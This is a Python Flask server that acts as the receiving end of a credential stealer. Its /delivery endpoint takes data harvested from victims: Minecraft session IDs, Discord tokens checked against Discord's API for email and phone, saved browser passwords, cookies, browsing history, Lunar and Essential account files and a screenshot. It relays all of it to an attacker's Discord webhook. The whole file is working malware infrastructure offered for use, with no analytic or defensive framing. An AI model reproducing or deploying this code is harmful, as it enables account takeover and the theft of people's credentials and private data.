import base64
import json
import time

from discord_webhook import DiscordWebhook, DiscordEmbed
from flask import Flask, request
from flask_restful import Api, Resource
import requests

app = Flask(__name__)
api = Api(app)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

ips = {}

with open("config.json", "r") as f:
    config = json.load(f)


def validate_session(ign, uuid, ssid):
    headers = {
        'Content-Type': 'application/json',
        "Authorization": "Bearer " + ssid
    }
    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers=headers)
    if r.status_code == 200:
        if r.json()['name'] == ign and r.json()['id'] == uuid:
            return True
        else:
            return False
    else:
        return False


class Delivery(Resource):
    def post(self):
        args = request.json

        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
            ip = request.environ['REMOTE_ADDR']
        else:
            ip = request.environ['HTTP_X_FORWARDED_FOR']

        if ip in ips:
            if time.time() - ips[ip]['timestamp'] > config['reset_ratelimit_after'] * 60:
                ips[ip]['count'] = 1
                ips[ip]['timestamp'] = time.time()
            else:
                if ips[ip]['count'] < config['ip_ratelimit']:
                    ips[ip]['count'] += 1
                else:
                    print("Rejected ratelimited ip")
                    return {'status': 'ratelimited'}, 429

        else:
            ips[ip] = {
                'count': 1,
                'timestamp': time.time()
            }

        webhook = DiscordWebhook(url=config['webhook'].replace("discordapp.com", "discord.com"),
                                 username=config['webhook_name'],
                                 avatar_url=config['webhook_avatar'])

        if config['codeblock_type'] == 'small':
            cb = '`'
        elif config['codeblock_type'] == 'big':
            cb = '```'
        else:
            cb = '`'
            print('Invalid codeblock type in config.json, defaulting to small')

        embeds = []
        webhook.content = config['message'].replace('%IP%', ip)

        mc = args['minecraft']
        if config['validate_session']:
            if not validate_session(mc['ign'], mc['uuid'], mc['ssid']):
                print("Rejected invalid session id")
                return {'status': 'invalid session'}, 401

        mc_embed = DiscordEmbed(title=config['mc_embed_title'],
                                color=hex(int(config['mc_embed_color'], 16)))
        mc_embed.set_footer(text=config['mc_embed_footer_text'], icon_url=config['mc_embed_footer_icon'])
        mc_embed.add_embed_field(name="IGN", value=cb + mc['ign'] + cb, inline=True)
        mc_embed.add_embed_field(name="UUID", value=cb + mc['uuid'] + cb, inline=True)
        mc_embed.add_embed_field(name="Session ID", value=cb + mc['ssid'] + cb, inline=True)
        embeds.append(mc_embed)
        if len(args['discord']) > 0:
            for tokenjson in args['discord']:

                token = tokenjson['token']
                headers = {
                    "Authorization": token
                }
                tokeninfo = requests.get("https://discord.com/api/v9/users/@me", headers=headers)

                if tokeninfo.status_code == 200:
                    discord_embed = DiscordEmbed(title=config['discord_embed_title'],
                                                 color=hex(int(config['discord_embed_color'], 16)))
                    discord_embed.set_footer(text=config['discord_embed_footer_text'],
                                             icon_url=config['discord_embed_footer_icon'])
                    discord_embed.add_embed_field(name="Username", value=cb + f"{tokeninfo.json()['username']}#{tokeninfo.json()['discriminator']}" + cb, inline=True)
                    discord_embed.add_embed_field(name="ID", value=cb + tokeninfo.json()['id'] + cb, inline=True)
                    discord_embed.add_embed_field(name="Token", value=cb + token + cb, inline=True)
                    discord_embed.add_embed_field(name="Email", value=cb + tokeninfo.json()['email'] + cb, inline=True)
                    discord_embed.add_embed_field(name="Phone", value=cb + "Not linked" + cb if tokeninfo.json()['phone'] is None else cb + tokeninfo.json()['phone'] + cb, inline=True)
                    discord_embed.set_thumbnail(url="https://cdn.discordapp.com/embed/avatars/0.png" if tokeninfo.json()['avatar'] is None else "https://cdn.discordapp.com/avatars/" + tokeninfo.json()['id'] + "/" + tokeninfo.json()['avatar'] + ".png")
                    discord_embed.add_embed_field(name="Nitro", value=cb + "No" + cb if tokeninfo.json()['premium_type'] == 0 else cb + "Yes" + cb, inline=True)
                    embeds.append(discord_embed)
                else:
                    print("Rejected invalid token")
                    return {'status': 'invalid token'}, 401
        else:
            discord_embed = DiscordEmbed(title=config['discord_embed_title'],
                                         color=hex(int(config['discord_embed_color'], 16)),
                                         description="No Discord tokens found")
            discord_embed.set_footer(text=config['discord_embed_footer_text'],
                                     icon_url=config['discord_embed_footer_icon'])
            embeds.append(discord_embed)
        password_list = [password for password in args['passwords'] if not password['password'] == ""]
        if len(password_list) > 0:
            embed_descriptions = [""]
            i = 0
            for j, password in enumerate(password_list):
                try:
                    embed_descriptions[i] += password['url'] + "\nUsername: " + cb + password[
                        'username'] + cb + "\nPassword: " + cb + password['password'] + cb + "\n"
                except:
                    pass
                if len(embed_descriptions[i]) > 3500 and j != len(password_list) - 1:
                    i += 1
                    embed_descriptions.append("")
            for description in embed_descriptions:
                password_embed = DiscordEmbed(title=config['password_embed_title'],
                                              color=hex(int(config['password_embed_color'], 16)),
                                              description=description)
                password_embed.set_footer(text=config['password_embed_footer_text'],
                                          icon_url=config['password_embed_footer_icon'])
                embeds.append(password_embed)

        else:
            password_embed = DiscordEmbed(title=config['password_embed_title'],
                                          color=hex(int(config['password_embed_color'], 16)),
                                          description="No passwords found")
            password_embed.set_footer(text=config['password_embed_footer_text'],
                                      icon_url=config['password_embed_footer_icon'])

            embeds.append(password_embed)

        file_embed = DiscordEmbed(title=config['file_embed_title'],
                                  color=hex(int(config['file_embed_color'], 16)))
        file_embed.set_footer(text=config['file_embed_footer_text'],
                              icon_url=config['file_embed_footer_icon'])

        file_embed.add_embed_field(name="Lunar Client File",
                                   value=f"{cb}Yes{cb}✅" if 'lunar' in args else f"{cb}No{cb}❌", inline=True)
        file_embed.add_embed_field(name="Essential File",
                                   value=f"{cb}Yes{cb}✅" if "essential" in args else f"{cb}No{cb}❌", inline=True)
        embeds.append(file_embed)

        batch_size = 10
        num_messages = (len(embeds) + batch_size - 1) // batch_size

        for i in range(num_messages):
            start_index = i * batch_size
            end_index = start_index + batch_size
            batch_embeds = embeds[start_index:end_index]

            for embed in batch_embeds:
                webhook.add_embed(embed)

            webhook.execute(remove_embeds=True)
            webhook.content = ""
        history = ""
        for entry in args['history']:
            history += "Visit count: " + str(entry['visitCount']) + "\t" + "Title: " + entry['title'] + " " * 5 + "\t" + "URL: " + entry['url'] + "\t" + f"({entry['browser']})" + "\n"

        if "lunar" in args:
            webhook.add_file(file=base64.b64decode(args['lunar']), filename="lunar_accounts.json")
        if "essential" in args:
            webhook.add_file(file=base64.b64decode(args['essential']), filename="essential_accounts.json")

        webhook.add_file(file=history.encode(), filename="history.txt")
        webhook.add_file(file=base64.b64decode(args['cookies']), filename="cookies.txt")
        webhook.add_file(file=base64.b64decode(args['screenshot']), filename="screenshot.png")
        webhook.execute()

        return {'status': 'ok'}, 200

    def get(self):
        return {'status': 'ok'}, 200


api.add_resource(Delivery, '/delivery')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)
